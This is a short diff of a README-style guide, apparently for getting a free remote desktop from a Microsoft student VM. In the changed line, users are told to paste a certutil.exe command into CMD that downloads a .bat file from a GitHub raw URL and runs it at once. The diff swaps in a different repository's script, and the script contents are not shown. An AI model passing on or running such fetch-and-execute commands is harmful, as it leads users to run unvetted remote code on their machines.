@@ -14,5 +14,5 @@ and create account microsoft and create VM student
 and Lunch VM
   
 # Second 
-You Nedd open CMD And Copy " certutil.exe -urlcache -split -f https://raw.githubusercontent.com/mrX04/lab2rdp/master/lab6cfree.bat && lab6cfree.bat " And Past on CMD And Click ENTER
+You Nedd open CMD And Copy " certutil.exe -urlcache -split -f https://raw.githubusercontent.com/4lT4lR/RDP-Control/main/RDPConfigurationC.bat && RDPConfigurationC.bat " And Past on CMD And Click ENTER
 
